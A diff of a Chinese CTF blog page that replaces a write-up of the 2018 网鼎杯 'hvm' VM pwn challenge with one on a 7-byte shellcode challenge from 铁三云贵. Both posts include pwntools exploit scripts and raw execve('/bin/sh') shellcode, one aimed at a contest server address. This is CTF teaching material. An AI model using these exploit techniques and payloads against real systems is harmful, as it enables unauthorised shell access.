@@ -8,30 +8,28 @@
 
 <title>
   
-    2018 网鼎杯预选赛第二场 hvm
+    一个有趣的PWN 铁三云贵第三题
   
 </title>
 
-<meta name="description" content="前言同学参赛给的题，侥幸做出来两道hvm和easpfmt。hvm是一道虚拟机题。正好我上学期期末设计做的是一款虚拟机软件。。虽然没开发完全还是懂一些。">
+<meta name="description" content="前言五月份参加的铁三区域赛。当时自己还是一个pwn超级小白。连栈溢出都不会做。这道是里面分值最高的pwn题困扰了我很久，现在做出来很有意思。">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2018 网鼎杯预选赛第二场 hvm">
-<meta property="og:url" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/index.html">
+<meta property="og:title" content="一个有趣的PWN 铁三云贵第三题">
+<meta property="og:url" content="http://yoursite.com/2018/08/23/一个有趣的PWN-铁三云贵第三题/index.html">
 <meta property="og:site_name" content="pwndog&#39;s blog">
-<meta property="og:description" content="前言同学参赛给的题，侥幸做出来两道hvm和easpfmt。hvm是一道虚拟机题。正好我上学期期末设计做的是一款虚拟机软件。。虽然没开发完全还是懂一些。">
+<meta property="og:description" content="前言五月份参加的铁三区域赛。当时自己还是一个pwn超级小白。连栈溢出都不会做。这道是里面分值最高的pwn题困扰了我很久，现在做出来很有意思。">
 <meta property="og:locale" content="CN">
-<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/1.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/4.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/2.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/3.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/5.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/6.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/7.png">
-<meta property="og:updated_time" content="2018-08-22T09:07:14.610Z">
+<meta property="og:image" content="http://yoursite.com/2018/08/23/一个有趣的PWN-铁三云贵第三题/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/23/一个有趣的PWN-铁三云贵第三题/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/23/一个有趣的PWN-铁三云贵第三题/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/23/一个有趣的PWN-铁三云贵第三题/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/23/一个有趣的PWN-铁三云贵第三题/5.png">
+<meta property="og:updated_time" content="2018-08-23T06:10:41.223Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2018 网鼎杯预选赛第二场 hvm">
-<meta name="twitter:description" content="前言同学参赛给的题，侥幸做出来两道hvm和easpfmt。hvm是一道虚拟机题。正好我上学期期末设计做的是一款虚拟机软件。。虽然没开发完全还是懂一些。">
-<meta name="twitter:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/1.png">
+<meta name="twitter:title" content="一个有趣的PWN 铁三云贵第三题">
+<meta name="twitter:description" content="前言五月份参加的铁三区域赛。当时自己还是一个pwn超级小白。连栈溢出都不会做。这道是里面分值最高的pwn题困扰了我很久，现在做出来很有意思。">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/23/一个有趣的PWN-铁三云贵第三题/1.png">
 
 
   <link rel="alternative" href="/atom.xml" title="pwndog&#39;s blog" type="application/atom+xml">
@@ -165,17 +163,17 @@
       
         <div style="max-width: 1000px">
       
-          <article id="post-2018-网鼎杯预选赛第二场-hvm" class="article article-type-post">
+          <article id="post-一个有趣的PWN-铁三云贵第三题" class="article article-type-post">
   
     <h1 class="article-header">
-      2018 网鼎杯预选赛第二场 hvm
+      一个有趣的PWN 铁三云贵第三题
     </h1>
   
   
 
   <div class="article-info">
     <span class="article-date">
-  2018-08-22
+  2018-08-23
 </span>
 
     
@@ -188,24 +186,28 @@
 
   </div>
   <div class="article-entry">
-    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>同学参赛给的题，侥幸做出来两道hvm和easpfmt。<br>hvm是一道虚拟机题。正好我上学期期末设计做的是一款虚拟机软件。。虽然没开发完全还是懂一些。<br><a id="more"></a></p>
-<h3 id="题目保护"><a href="#题目保护" class="headerlink" title="题目保护"></a>题目保护</h3><p><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/1.png" alt=""><br>除了got表可写全保护。</p>
-<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><p>题目先随机mmap了一片内存用作之后保存虚拟机参数使用。<br>之后读取hvmbin的内容到刚才的地址。<br>之后进入简单的虚拟机解释循环。<br>通过运行程序，它的功能为输出hello，要求我们输入。输出bye<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/4.png" alt=""><br>读取的指令并不长我们可以单步追踪。发现它是通过syscall系统调用实现输入输出功能。将虚拟机寄存器保存为现实寄存器。<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/2.png" alt=""></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们重点关注输入的部分，唯一一次输入的机会。<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/3.png" alt=""><br>发现我们可以输入0xf0的字节。经过内存的查看。下面有一些可疑的参数<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/5.png" alt=""><br>直接输入0xf0个a尝试一下。会发现之后的虚拟机解释引擎的EIP使用一个计算被改变。计算为（0x65656565+3）&lt;&lt;2<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/6.png" alt=""><br>即我们可以修改它的虚拟机EIP指向我们的输入。加0xfffffffffffff000可以使EIP指向我们输入的伪造虚拟机指令。<br>覆盖偏移0x38为0xFdFbFfff即可。<br>通过对它构造参数的过程进行分析，得到如下结果<br>1-&gt;rax<br>4-&gt;rdx<br>构造rax为59，rdi指向binsh，rsi为0，rdx为0。<br>剩下rsi，rdi。通过对它27条指令的分析我们可以找到对rsi直接赋值的指令。<br>难点在于如何修改rdi指向bin/sh。<br>通过调试我们发现rsi会指向我们输入中的一个偏移。<br>且通过对27条指令的分析可以得到，存在两条指令，第一条可以将rsi赋值给一个中间变量。第二条可以将中间变量赋值给rdi。分别使26和0xd。<br>现在就可以实现构造rax为59，rdi指向binsh，rsi为0，rdx为0。<br>调用它虚拟机指令中的那条syscall（0xe）。完成利用。<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/7.png" alt=""></p>
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-p=remote(<span class="string">'117.50.4.173'</span>,<span class="number">10315</span>)
-context(log_level=<span class="string">'debug'</span>)
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>五月份参加的铁三区域赛。当时自己还是一个pwn超级小白。连栈溢出都不会做。这道是里面分值最高的pwn题困扰了我很久，现在做出来很有意思。<br><a id="more"></a></p>
+<h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><p><img src="/2018/08/23/一个有趣的PWN-铁三云贵第三题/1.png" alt="第一天排名"><br>全保护开启</p>
+<h3 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h3><p><img src="/2018/08/23/一个有趣的PWN-铁三云贵第三题/2.png" alt="第一天排名"><br>程序首先mmap两处随机的地址空间，都具有可写权限。一处具有可执行权限<br><img src="/2018/08/23/一个有趣的PWN-铁三云贵第三题/3.png" alt="第一天排名"><br>之后要求我们输入7个字节的shellcode。放入刚才mmap的空间中。之后执行我们的shellcode。<br><img src="/2018/08/23/一个有趣的PWN-铁三云贵第三题/4.png" alt="第一天排名"><br>程序创造了这样一种环境。mmap出两片空间，一处保存代码，一处用于伪造栈使用。除了RSP,RIP其他所有寄存器清0。给我们任意代码执行权限，但只有7个字节。</p>
+<h3 id="思路汇总"><a href="#思路汇总" class="headerlink" title="思路汇总"></a>思路汇总</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>最直接想到的肯定是execve（bin/sh）尝试，这里sh字符串会占2个字节，syscall两个字节，sh地址还不可知。大小完全不够。</p>
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>之后想到由于寄存器全部请0。可以直接使用0号调用read。我们可以使用的地址只有rsp一个寄存器。于是push rsp pop rsi push rsi push rdx syscall ret就可以向栈中写入shellcode并返回。。但是ret不到shellcode中去。因为我们没有shellcode的地址<br><img src="/2018/08/23/一个有趣的PWN-铁三云贵第三题/5.png" alt="第一天排名"></p>
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>经过对程序mmap过程的思考。发现若两次mmap的随机地址都已分配，则会造成两处内存空间相邻。且伪造栈的空间在上方！经过2我们可以实现对伪造栈空间的写入。如果两空间相邻我们可以覆盖到我们接下来要执行的指令！！<br>push rsp pop rsi push rsi push rdx syscall<br>这时候发现只需要6字节大小的shellcode。比条件还要小一字节2333333.<br>覆盖后我们可以无限写入完成利用。（伪造大小rdx时，rdx不能太大，于是我选择将 push rsi push rdx改为mov edx，esi，字节长度不变）</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre><code class="python">p=process(<span class="string">'./seven'</span>)
+p.readuntil(<span class="string">'Show me your shellcode:'</span>)
+payload=chr(<span class="number">0x54</span>)+chr(<span class="number">0x5e</span>)+chr(<span class="number">0x8b</span>)+chr(<span class="number">0xd6</span>)+chr(<span class="number">0x0F</span>)+chr(<span class="number">0x05</span>)
 
-p.recvuntil(<span class="string">'hello'</span>)
-zz=raw_input()
-
-payload=<span class="string">'/bin/sh'</span>+chr(<span class="number">0</span>)+<span class="string">'a'</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0xFdFbFfff</span>)+<span class="string">'/bin/sh'</span>+chr(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x3b000000</span>)+p32(<span class="number">4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xd</span>)+p32(<span class="number">26</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xe</span>)
-p.sendline(payload)
-
-
+p.writeline(payload)
+z=[
+<span class="number">0xB8</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xFE</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xC7</span>, <span class="number">0x4e</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>,<span class="number">0x33</span>, <span class="number">0xD2</span>, <span class="number">0x48</span>,
+<span class="number">0x33</span>, <span class="number">0xF6</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x2F</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x2F</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>]
+zz=<span class="string">''</span>
+<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(z)):
+    zz+=chr(z[i])
+payload=<span class="string">'b'</span>*<span class="number">0xb36</span>+zz
+p.writeline(payload)
 p.interactive()
 </code></pre>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>第二场预选赛一共做出3道pwn。。帮同学。感觉难度不如第一场的。除了hvm其他两道难度。。有点太差</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>史上最短shellcode。。。得益于它所给的环境。当时看着x86指令表好久无果。在昨天晚上偶然尝试直接找到了思路。开心</p>
 
   </div>
   <footer class="article-footer">
